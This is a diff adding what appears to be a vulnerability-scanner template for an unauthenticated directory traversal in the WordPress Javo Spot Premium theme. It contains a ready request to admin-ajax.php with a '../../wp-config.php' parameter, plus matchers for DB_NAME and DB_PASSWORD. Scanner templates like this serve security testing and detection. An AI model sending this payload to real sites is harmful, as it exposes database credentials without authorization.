@@ -1,0 +1,25 @@
+id: wp-spot-premium-lfi
+brief:
+    title: WordPress Javo Spot Premium Theme - Unauthenticated Directory Traversal
+    by: dhiyaneshDk
+    level: high
+    about: WordPress Javo Spot Premium Theme `wp-config` was discovered via local file inclusion. This file is remotely accessible and its content available for reading.
+    label:
+        - wordpress
+        - backup
+        - wpscan
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
